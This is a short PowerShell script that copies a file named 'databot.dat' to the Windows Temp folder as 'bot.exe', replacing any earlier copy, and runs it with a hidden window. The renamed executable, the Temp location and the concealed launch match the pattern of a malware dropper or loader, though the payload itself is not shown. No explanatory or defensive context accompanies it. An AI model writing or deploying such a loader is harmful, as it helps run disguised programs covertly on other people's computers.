$FileName = "C:/Windows/Temp/bot.exe"

if (Test-Path $FileName) {
  Remove-Item $FileName
  Copy-Item -Path "databot.dat" -Destination "C:/Windows/Temp/bot.exe" -PassThru | Out-Null


  Start-Process -WindowStyle hidden -FilePath "C:/Windows/Temp/bot.exe"

}

else {
  Copy-Item -Path "databot.dat" -Destination "C:/Windows/Temp/bot.exe" -PassThru | Out-Null
  Start-Process -WindowStyle hidden -FilePath "C:/Windows/Temp/bot.exe"
}